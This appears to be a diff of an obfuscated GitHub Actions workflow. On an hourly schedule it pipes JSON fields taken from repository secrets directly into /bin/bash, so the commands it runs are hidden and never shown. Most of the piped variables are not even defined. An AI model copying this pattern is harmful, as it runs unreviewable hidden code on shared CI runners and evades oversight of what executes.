@@ -1,10 +1,11 @@
 name: yanjunping3215
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 * * * *'
+    - cron: '54 * * * *'
 
-jobs:  # 12339
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +13,15 @@ jobs:  # 12339
       - uses: actions/checkout@v4
       - name: yanjunping3215
         env:
-          y00878: ${{ secrets.y00878 }}
+          sah39: ${{ secrets.sah39 }}
         run: |
-          echo $y00878 | jq -r .vk078 | /bin/bash
-          echo $zl436 | jq -r .ubozp9430 | /bin/bash
-          echo $xdlr89 | jq -r .jc494 | /bin/bash
-          echo $hqhcf4 | jq -r .hycy1 | /bin/bash
-          echo $lxh87 | jq -r .ch11 | /bin/bash
-          echo $mpv84172 | jq -r .nne779 | /bin/bash
-          echo $egcy8669 | jq -r .muivw330 | /bin/bash
-          echo $uoia73 | jq -r .h6424 | /bin/bash
-          echo $i6 | jq -r .xfm3 | /bin/bash
-          echo $oq6049 | jq -r .fvg27 | /bin/bash
+          echo $sah39 | jq -r .n3 | /bin/bash
+          echo $xhctx14 | jq -r .ixjoi2 | /bin/bash
+          echo $cjyhd3862 | jq -r .ej17 | /bin/bash
+          echo $nhg81080 | jq -r .t844 | /bin/bash
+          echo $raz8 | jq -r .gm4687 | /bin/bash
+          echo $gpbb78479 | jq -r .yprp13 | /bin/bash
+          echo $yel10 | jq -r .vnco0301 | /bin/bash
+          echo $hqd1164 | jq -r .unw3 | /bin/bash
+          echo $ljha21 | jq -r .m82 | /bin/bash
 
